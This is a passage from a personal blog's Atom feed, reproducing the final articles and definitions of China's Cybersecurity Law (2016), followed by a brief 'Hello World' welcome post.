title="第七十三条"></a><strong>第七十三条</strong></h2><p>网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><h2 id="第七十四条"><a href="#第七十四条" class="headerlink" title="第七十四条"></a><strong>第七十四条</strong></h2><p>违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><h2 id="第七十五条"><a href="#第七十五条" class="headerlink" title="第七十五条"></a><strong>第七十五条</strong></h2><p>境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h1 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章 附则"></a>第七章 附则</h1><h2 id="第七十六条"><a href="#第七十六条" class="headerlink" title="第七十六条"></a><strong>第七十六条</strong></h2><p>本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><h2 id="第七十七条"><a href="#第七十七条" class="headerlink" title="第七十七条"></a><strong>第七十七条</strong></h2><p>存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><h2 id="第七十八条"><a href="#第七十八条" class="headerlink" title="第七十八条"></a><strong>第七十八条</strong></h2><p>军事网络的安全保护，由中央军事委员会另行规定。</p><h2 id="第七十九条"><a href="#第七十九条" class="headerlink" title="第七十九条"></a><strong>第七十九条</strong></h2><p>本法自2017年6月1日起施行。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;发布时间：2016-11-08 来源：政策法规司&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;中华人民共和国主席令&lt;/p&gt;
&lt;p&gt;第五十三号&lt;/p&gt;
&lt;p&gt;《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://zo1ro.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zo1ro.github.io/2018/03/28/hello-world/"/>
    <id>https://zo1ro.github.io/2018/03/28/hello-world/</id>
    <published>2018-03-27T16:00:00.000Z</published>
    <updated>2019-06-28T04:48:58.668Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to my blog!<br><a id="more"></a><br>Study well and make progress every day.</p><p>hello world :)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to my blog!&lt;br&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://zo1ro.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
